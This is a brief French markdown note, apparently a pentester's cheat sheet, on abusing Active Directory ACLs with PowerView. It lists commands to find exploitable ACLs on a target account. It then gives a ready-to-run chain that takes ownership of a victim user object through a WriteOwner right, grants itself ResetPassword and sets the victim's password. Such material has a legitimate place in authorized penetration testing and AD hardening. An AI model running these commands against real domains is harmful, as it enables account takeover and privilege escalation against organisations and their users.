---
public: true # set to true to make the article publishable
---


```powershell
. .\PowerView.ps1
# ACLs intéressantes (très long)
Find-InterestingDomainAcl

# ACLs liées à un compte spécifique ($targetUserName)
$sid = Convert-NameToSid $targetUserName 
# peu prendre beaucoup de temps (plusieures minutes vois dizaines de minutes)
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```

## Exemples 

```powershell title="Réinitialisation du mot de passe AD via appropriation de l'objet utilisateur cible"

# Appropriation d'un utilisateur (lorsqu'on a un droit WriteOwner référencé dans Bloodhound)
Set-DomainObjectOwner -Identity $targetUser -OwnerIdentity source_user
# Ajout d'une ACL sur le compte approprié pour réinitialiser le password :
Add-DomainObjectAcl -TargetIdentity $targetUser -PrincipalIdentity source_user -Rights ResetPassword

# Réinitialisation du password
$pass = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
Set-DomainUserPassword -Identity Target_AD_User -Password $pass
```

```
#
```